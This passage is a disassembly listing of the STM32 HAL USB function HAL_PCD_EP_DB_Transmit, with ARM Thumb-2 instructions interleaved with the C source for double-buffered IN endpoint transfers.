 800307e:	681b      	ldr	r3, [r3, #0]
 8003080:	461a      	mov	r2, r3
 8003082:	68bb      	ldr	r3, [r7, #8]
 8003084:	781b      	ldrb	r3, [r3, #0]
 8003086:	009b      	lsls	r3, r3, #2
 8003088:	441a      	add	r2, r3
 800308a:	8afb      	ldrh	r3, [r7, #22]
 800308c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003090:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003094:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003098:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800309c:	b29b      	uxth	r3, r3
 800309e:	8013      	strh	r3, [r2, #0]
 80030a0:	e2d8      	b.n	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80030a2:	88fb      	ldrh	r3, [r7, #6]
 80030a4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80030a8:	2b00      	cmp	r3, #0
 80030aa:	d021      	beq.n	80030f0 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030ac:	68fb      	ldr	r3, [r7, #12]
 80030ae:	681b      	ldr	r3, [r3, #0]
 80030b0:	461a      	mov	r2, r3
 80030b2:	68bb      	ldr	r3, [r7, #8]
 80030b4:	781b      	ldrb	r3, [r3, #0]
 80030b6:	009b      	lsls	r3, r3, #2
 80030b8:	4413      	add	r3, r2
 80030ba:	881b      	ldrh	r3, [r3, #0]
 80030bc:	b29b      	uxth	r3, r3
 80030be:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030c2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030c6:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80030ca:	68fb      	ldr	r3, [r7, #12]
 80030cc:	681b      	ldr	r3, [r3, #0]
 80030ce:	461a      	mov	r2, r3
 80030d0:	68bb      	ldr	r3, [r7, #8]
 80030d2:	781b      	ldrb	r3, [r3, #0]
 80030d4:	009b      	lsls	r3, r3, #2
 80030d6:	441a      	add	r2, r3
 80030d8:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80030dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030e4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80030e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80030ec:	b29b      	uxth	r3, r3
 80030ee:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80030f0:	68bb      	ldr	r3, [r7, #8]
 80030f2:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80030f6:	2b01      	cmp	r3, #1
 80030f8:	f040 82ac 	bne.w	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80030fc:	68bb      	ldr	r3, [r7, #8]
 80030fe:	695a      	ldr	r2, [r3, #20]
 8003100:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003104:	441a      	add	r2, r3
 8003106:	68bb      	ldr	r3, [r7, #8]
 8003108:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800310a:	68bb      	ldr	r3, [r7, #8]
 800310c:	69da      	ldr	r2, [r3, #28]
 800310e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003112:	441a      	add	r2, r3
 8003114:	68bb      	ldr	r3, [r7, #8]
 8003116:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003118:	68bb      	ldr	r3, [r7, #8]
 800311a:	6a1a      	ldr	r2, [r3, #32]
 800311c:	68bb      	ldr	r3, [r7, #8]
 800311e:	691b      	ldr	r3, [r3, #16]
 8003120:	429a      	cmp	r2, r3
 8003122:	d30b      	bcc.n	800313c <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003124:	68bb      	ldr	r3, [r7, #8]
 8003126:	691b      	ldr	r3, [r3, #16]
 8003128:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 800312c:	68bb      	ldr	r3, [r7, #8]
 800312e:	6a1a      	ldr	r2, [r3, #32]
 8003130:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003134:	1ad2      	subs	r2, r2, r3
 8003136:	68bb      	ldr	r3, [r7, #8]
 8003138:	621a      	str	r2, [r3, #32]
 800313a:	e017      	b.n	800316c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 800313c:	68bb      	ldr	r3, [r7, #8]
 800313e:	6a1b      	ldr	r3, [r3, #32]
 8003140:	2b00      	cmp	r3, #0
 8003142:	d108      	bne.n	8003156 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 8003144:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003148:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 800314c:	68bb      	ldr	r3, [r7, #8]
 800314e:	2200      	movs	r2, #0
 8003150:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003154:	e00a      	b.n	800316c <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 8003156:	68bb      	ldr	r3, [r7, #8]
 8003158:	2200      	movs	r2, #0
 800315a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 800315e:	68bb      	ldr	r3, [r7, #8]
 8003160:	6a1b      	ldr	r3, [r3, #32]
 8003162:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003166:	68bb      	ldr	r3, [r7, #8]
 8003168:	2200      	movs	r2, #0
 800316a:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 800316c:	68bb      	ldr	r3, [r7, #8]
 800316e:	785b      	ldrb	r3, [r3, #1]
 8003170:	2b00      	cmp	r3, #0
 8003172:	d165      	bne.n	8003240 <HAL_PCD_EP_DB_Transmit+0x37e>
 8003174:	68fb      	ldr	r3, [r7, #12]
 8003176:	681b      	ldr	r3, [r3, #0]
 8003178:	63fb      	str	r3, [r7, #60]	; 0x3c
 800317a:	68fb      	ldr	r3, [r7, #12]
 800317c:	681b      	ldr	r3, [r3, #0]
 800317e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003182:	b29b      	uxth	r3, r3
 8003184:	461a      	mov	r2, r3
 8003186:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003188:	4413      	add	r3, r2
 800318a:	63fb      	str	r3, [r7, #60]	; 0x3c
 800318c:	68bb      	ldr	r3, [r7, #8]
 800318e:	781b      	ldrb	r3, [r3, #0]
 8003190:	00da      	lsls	r2, r3, #3
 8003192:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003194:	4413      	add	r3, r2
 8003196:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800319a:	63bb      	str	r3, [r7, #56]	; 0x38
 800319c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800319e:	881b      	ldrh	r3, [r3, #0]
 80031a0:	b29b      	uxth	r3, r3
 80031a2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031a6:	b29a      	uxth	r2, r3
 80031a8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031aa:	801a      	strh	r2, [r3, #0]
 80031ac:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031b0:	2b3e      	cmp	r3, #62	; 0x3e
 80031b2:	d91d      	bls.n	80031f0 <HAL_PCD_EP_DB_Transmit+0x32e>
 80031b4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031b8:	095b      	lsrs	r3, r3, #5
 80031ba:	64bb      	str	r3, [r7, #72]	; 0x48
 80031bc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031c0:	f003 031f 	and.w	r3, r3, #31
 80031c4:	2b00      	cmp	r3, #0
 80031c6:	d102      	bne.n	80031ce <HAL_PCD_EP_DB_Transmit+0x30c>
 80031c8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031ca:	3b01      	subs	r3, #1
 80031cc:	64bb      	str	r3, [r7, #72]	; 0x48
 80031ce:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031d0:	881b      	ldrh	r3, [r3, #0]
 80031d2:	b29a      	uxth	r2, r3
 80031d4:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031d6:	b29b      	uxth	r3, r3
 80031d8:	029b      	lsls	r3, r3, #10
 80031da:	b29b      	uxth	r3, r3
 80031dc:	4313      	orrs	r3, r2
 80031de:	b29b      	uxth	r3, r3
 80031e0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80031e4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80031e8:	b29a      	uxth	r2, r3
 80031ea:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ec:	801a      	strh	r2, [r3, #0]
 80031ee:	e044      	b.n	800327a <HAL_PCD_EP_DB_Transmit+0x3b8>
 80031f0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031f4:	2b00      	cmp	r3, #0
 80031f6:	d10a      	bne.n	800320e <HAL_PCD_EP_DB_Transmit+0x34c>
 80031f8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031fa:	881b      	ldrh	r3, [r3, #0]
 80031fc:	b29b      	uxth	r3, r3
 80031fe:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003202:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003206:	b29a      	uxth	r2, r3
 8003208:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800320a:	801a      	strh	r2, [r3, #0]
 800320c:	e035      	b.n	800327a <HAL_PCD_EP_DB_Transmit+0x3b8>
 800320e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003212:	085b      	lsrs	r3, r3, #1
 8003214:	64bb      	str	r3, [r7, #72]	; 0x48
 8003216:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800321a:	f003 0301 	and.w	r3, r3, #1
 800321e:	2b00      	cmp	r3, #0
 8003220:	d002      	beq.n	8003228 <HAL_PCD_EP_DB_Transmit+0x366>
 8003222:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003224:	3301      	adds	r3, #1
 8003226:	64bb      	str	r3, [r7, #72]	; 0x48
 8003228:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800322a:	881b      	ldrh	r3, [r3, #0]
 800322c:	b29a      	uxth	r2, r3
 800322e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003230:	b29b      	uxth	r3, r3
 8003232:	029b      	lsls	r3, r3, #10
 8003234:	b29b      	uxth	r3, r3
 8003236:	4313      	orrs	r3, r2
 8003238:	b29a      	uxth	r2, r3
 800323a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800323c:	801a      	strh	r2, [r3, #0]
 800323e:	e01c      	b.n	800327a <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003240:	68bb      	ldr	r3, [r7, #8]
 8003242:	785b      	ldrb	r3, [r3, #1]
 8003244:	2b01      	cmp	r3, #1
 8003246:	d118      	bne.n	800327a <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003248:	68fb      	ldr	r3, [r7, #12]
 800324a:	681b      	ldr	r3, [r3, #0]
 800324c:	647b      	str	r3, [r7, #68]	; 0x44
 800324e:	68fb      	ldr	r3, [r7, #12]
 8003250:	681b      	ldr	r3, [r3, #0]
 8003252:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003256:	b29b      	uxth	r3, r3
 8003258:	461a      	mov	r2, r3
 800325a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800325c:	4413      	add	r3, r2
 800325e:	647b      	str	r3, [r7, #68]	; 0x44
 8003260:	68bb      	ldr	r3, [r7, #8]
 8003262:	781b      	ldrb	r3, [r3, #0]
 8003264:	00da      	lsls	r2, r3, #3
 8003266:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003268:	4413      	add	r3, r2
 800326a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800326e:	643b      	str	r3, [r7, #64]	; 0x40
 8003270:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003274:	b29a      	uxth	r2, r3
 8003276:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8003278:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 800327a:	68fb      	ldr	r3, [r7, #12]
 800327c:	6818      	ldr	r0, [r3, #0]
 800327e:	68bb      	ldr	r3, [r7, #8]
 8003280:	6959      	ldr	r1, [r3, #20]
 8003282:	68bb      	ldr	r3, [r7, #8]
 8003284:	891a      	ldrh	r2, [r3, #8]
 8003286:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800328a:	b29b      	uxth	r3, r3
 800328c:	f005 f8c9 	bl	8008422 <USB_WritePMA>
 8003290:	e1e0      	b.n	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003292:	68fb      	ldr	r3, [r7, #12]
 8003294:	681b      	ldr	r3, [r3, #0]
 8003296:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800329a:	b29b      	uxth	r3, r3
 800329c:	461a      	mov	r2, r3
 800329e:	68bb      	ldr	r3, [r7, #8]
 80032a0:	781b      	ldrb	r3, [r3, #0]
 80032a2:	00db      	lsls	r3, r3, #3
 80032a4:	4413      	add	r3, r2
 80032a6:	68fa      	ldr	r2, [r7, #12]
 80032a8:	6812      	ldr	r2, [r2, #0]
 80032aa:	4413      	add	r3, r2
 80032ac:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032b0:	881b      	ldrh	r3, [r3, #0]
 80032b2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80032b6:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 80032ba:	68bb      	ldr	r3, [r7, #8]
 80032bc:	699a      	ldr	r2, [r3, #24]
 80032be:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032c2:	429a      	cmp	r2, r3
 80032c4:	d307      	bcc.n	80032d6 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80032c6:	68bb      	ldr	r3, [r7, #8]
 80032c8:	699a      	ldr	r2, [r3, #24]
 80032ca:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032ce:	1ad2      	subs	r2, r2, r3
 80032d0:	68bb      	ldr	r3, [r7, #8]
 80032d2:	619a      	str	r2, [r3, #24]
 80032d4:	e002      	b.n	80032dc <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80032d6:	68bb      	ldr	r3, [r7, #8]
 80032d8:	2200      	movs	r2, #0
 80032da:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80032dc:	68bb      	ldr	r3, [r7, #8]
 80032de:	699b      	ldr	r3, [r3, #24]
 80032e0:	2b00      	cmp	r3, #0
 80032e2:	f040 80c0 	bne.w	8003466 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80032e6:	68bb      	ldr	r3, [r7, #8]
 80032e8:	785b      	ldrb	r3, [r3, #1]
 80032ea:	2b00      	cmp	r3, #0
 80032ec:	d126      	bne.n	800333c <HAL_PCD_EP_DB_Transmit+0x47a>
 80032ee:	68fb      	ldr	r3, [r7, #12]
 80032f0:	681b      	ldr	r3, [r3, #0]
 80032f2:	67fb      	str	r3, [r7, #124]	; 0x7c
 80032f4:	68fb      	ldr	r3, [r7, #12]
 80032f6:	681b      	ldr	r3, [r3, #0]
 80032f8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032fc:	b29b      	uxth	r3, r3
 80032fe:	461a      	mov	r2, r3
 8003300:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003302:	4413      	add	r3, r2
 8003304:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003306:	68bb      	ldr	r3, [r7, #8]
 8003308:	781b      	ldrb	r3, [r3, #0]
 800330a:	00da      	lsls	r2, r3, #3
 800330c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800330e:	4413      	add	r3, r2
 8003310:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003314:	67bb      	str	r3, [r7, #120]	; 0x78
 8003316:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003318:	881b      	ldrh	r3, [r3, #0]
 800331a:	b29b      	uxth	r3, r3
 800331c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003320:	b29a      	uxth	r2, r3
 8003322:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003324:	801a      	strh	r2, [r3, #0]
 8003326:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003328:	881b      	ldrh	r3, [r3, #0]
 800332a:	b29b      	uxth	r3, r3
 800332c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003330:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003334:	b29a      	uxth	r2, r3
 8003336:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003338:	801a      	strh	r2, [r3, #0]
 800333a:	e01a      	b.n	8003372 <HAL_PCD_EP_DB_Transmit+0x4b0>
 800333c:	68bb      	ldr	r3, [r7, #8]
 800333e:	785b      	ldrb	r3, [r3, #1]
 8003340:	2b01      	cmp	r3, #1
 8003342:	d116      	bne.n	8003372 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003344:	68fb      	ldr	r3, [r7, #12]
 8003346:	681b      	ldr	r3, [r3, #0]
 8003348:	667b      	str	r3, [r7, #100]	; 0x64
 800334a:	68fb      	ldr	r3, [r7, #12]
 800334c:	681b      	ldr	r3, [r3, #0]
 800334e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003352:	b29b      	uxth	r3, r3
 8003354:	461a      	mov	r2, r3
 8003356:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003358:	4413      	add	r3, r2
 800335a:	667b      	str	r3, [r7, #100]	; 0x64
 800335c:	68bb      	ldr	r3, [r7, #8]
 800335e:	781b      	ldrb	r3, [r3, #0]
 8003360:	00da      	lsls	r2, r3, #3
 8003362:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003364:	4413      	add	r3, r2
 8003366:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800336a:	663b      	str	r3, [r7, #96]	; 0x60
 800336c:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 800336e:	2200      	movs	r2, #0
 8003370:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003372:	68fb      	ldr	r3, [r7, #12]
 8003374:	681b      	ldr	r3, [r3, #0]
 8003376:	677b      	str	r3, [r7, #116]	; 0x74
 8003378:	68bb      	ldr	r3, [r7, #8]
 800337a:	785b      	ldrb	r3, [r3, #1]
 800337c:	2b00      	cmp	r3, #0
 800337e:	d12b      	bne.n	80033d8 <HAL_PCD_EP_DB_Transmit+0x516>
 8003380:	68fb      	ldr	r3, [r7, #12]
 8003382:	681b      	ldr	r3, [r3, #0]
 8003384:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003386:	68fb      	ldr	r3, [r7, #12]
 8003388:	681b      	ldr	r3, [r3, #0]
 800338a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800338e:	b29b      	uxth	r3, r3
 8003390:	461a      	mov	r2, r3
 8003392:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003394:	4413      	add	r3, r2
 8003396:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003398:	68bb      	ldr	r3, [r7, #8]
 800339a:	781b      	ldrb	r3, [r3, #0]
 800339c:	00da      	lsls	r2, r3, #3
 800339e:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80033a0:	4413      	add	r3, r2
 80033a2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80033a6:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80033aa:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033ae:	881b      	ldrh	r3, [r3, #0]
 80033b0:	b29b      	uxth	r3, r3
 80033b2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80033b6:	b29a      	uxth	r2, r3
 80033b8:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033bc:	801a      	strh	r2, [r3, #0]
 80033be:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033c2:	881b      	ldrh	r3, [r3, #0]
 80033c4:	b29b      	uxth	r3, r3
 80033c6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033ca:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033ce:	b29a      	uxth	r2, r3
 80033d0:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033d4:	801a      	strh	r2, [r3, #0]
 80033d6:	e017      	b.n	8003408 <HAL_PCD_EP_DB_Transmit+0x546>
 80033d8:	68bb      	ldr	r3, [r7, #8]
 80033da:	785b      	ldrb	r3, [r3, #1]
 80033dc:	2b01      	cmp	r3, #1
 80033de:	d113      	bne.n	8003408 <HAL_PCD_EP_DB_Transmit+0x546>
 80033e0:	68fb      	ldr	r3, [r7, #12]
 80033e2:	681b      	ldr	r3, [r3, #0]
 80033e4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033e8:	b29b      	uxth	r3, r3
 80033ea:	461a      	mov	r2, r3
 80033ec:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80033ee:	4413      	add	r3, r2
 80033f0:	677b      	str	r3, [r7, #116]	; 0x74
 80033f2:	68bb      	ldr	r3, [r7, #8]
 80033f4:	781b      	ldrb	r3, [r3, #0]
 80033f6:	00da      	lsls	r2, r3, #3
 80033f8:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80033fa:	4413      	add	r3, r2
 80033fc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003400:	673b      	str	r3, [r7, #112]	; 0x70
 8003402:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003404:	2200      	movs	r2, #0
 8003406:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003408:	68bb      	ldr	r3, [r7, #8]
 800340a:	781b      	ldrb	r3, [r3, #0]
 800340c:	4619      	mov	r1, r3
 800340e:	68f8      	ldr	r0, [r7, #12]
 8003410:	f009 fa69 	bl	800c8e6 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003414:	88fb      	ldrh	r3, [r7, #6]
 8003416:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800341a:	2b00      	cmp	r3, #0
 800341c:	f040 811a 	bne.w	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003420:	68fb      	ldr	r3, [r7, #12]
 8003422:	681b      	ldr	r3, [r3, #0]
 8003424:	461a      	mov	r2, r3
 8003426:	68bb      	ldr	r3, [r7, #8]
 8003428:	781b      	ldrb	r3, [r3, #0]
 800342a:	009b      	lsls	r3, r3, #2
 800342c:	4413      	add	r3, r2
 800342e:	881b      	ldrh	r3, [r3, #0]
 8003430:	b29b      	uxth	r3, r3
 8003432:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003436:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800343a:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 800343e:	68fb      	ldr	r3, [r7, #12]
 8003440:	681b      	ldr	r3, [r3, #0]
 8003442:	461a      	mov	r2, r3
 8003444:	68bb      	ldr	r3, [r7, #8]
 8003446:	781b      	ldrb	r3, [r3, #0]
 8003448:	009b      	lsls	r3, r3, #2
 800344a:	441a      	add	r2, r3
 800344c:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003450:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003454:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003458:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800345c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003460:	b29b      	uxth	r3, r3
 8003462:	8013      	strh	r3, [r2, #0]
 8003464:	e0f6      	b.n	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003466:	88fb      	ldrh	r3, [r7, #6]
 8003468:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800346c:	2b00      	cmp	r3, #0
 800346e:	d121      	bne.n	80034b4 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003470:	68fb      	ldr	r3, [r7, #12]
 8003472:	681b      	ldr	r3, [r3, #0]
 8003474:	461a      	mov	r2, r3
 8003476:	68bb      	ldr	r3, [r7, #8]
 8003478:	781b      	ldrb	r3, [r3, #0]
 800347a:	009b      	lsls	r3, r3, #2
 800347c:	4413      	add	r3, r2
 800347e:	881b      	ldrh	r3, [r3, #0]
 8003480:	b29b      	uxth	r3, r3
 8003482:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003486:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800348a:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 800348e:	68fb      	ldr	r3, [r7, #12]
 8003490:	681b      	ldr	r3, [r3, #0]
 8003492:	461a      	mov	r2, r3
 8003494:	68bb      	ldr	r3, [r7, #8]
 8003496:	781b      	ldrb	r3, [r3, #0]
 8003498:	009b      	lsls	r3, r3, #2
 800349a:	441a      	add	r2, r3
 800349c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80034a0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80034a4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80034a8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034ac:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034b0:	b29b      	uxth	r3, r3
 80034b2:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80034b4:	68bb      	ldr	r3, [r7, #8]
 80034b6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80034ba:	2b01      	cmp	r3, #1
 80034bc:	f040 80ca 	bne.w	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80034c0:	68bb      	ldr	r3, [r7, #8]
 80034c2:	695a      	ldr	r2, [r3, #20]
 80034c4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034c8:	441a      	add	r2, r3
 80034ca:	68bb      	ldr	r3, [r7, #8]
 80034cc:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80034ce:	68bb      	ldr	r3, [r7, #8]
 80034d0:	69da      	ldr	r2, [r3, #28]
 80034d2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034d6:	441a      	add	r2, r3
 80034d8:	68bb      	ldr	r3, [r7, #8]
 80034da:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80034dc:	68bb      	ldr	r3, [r7, #8]
 80034de:	6a1a      	ldr	r2, [r3, #32]
 80034e0:	68bb      	ldr	r3, [r7, #8]
 80034e2:	691b      	ldr	r3, [r3, #16]
 80034e4:	429a      	cmp	r2, r3
 80034e6:	d30b      	bcc.n	8003500 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 80034e8:	68bb      	ldr	r3, [r7, #8]
 80034ea:	691b      	ldr	r3, [r3, #16]
 80034ec:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80034f0:	68bb      	ldr	r3, [r7, #8]
 80034f2:	6a1a      	ldr	r2, [r3, #32]
 80034f4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034f8:	1ad2      	subs	r2, r2, r3
 80034fa:	68bb      	ldr	r3, [r7, #8]
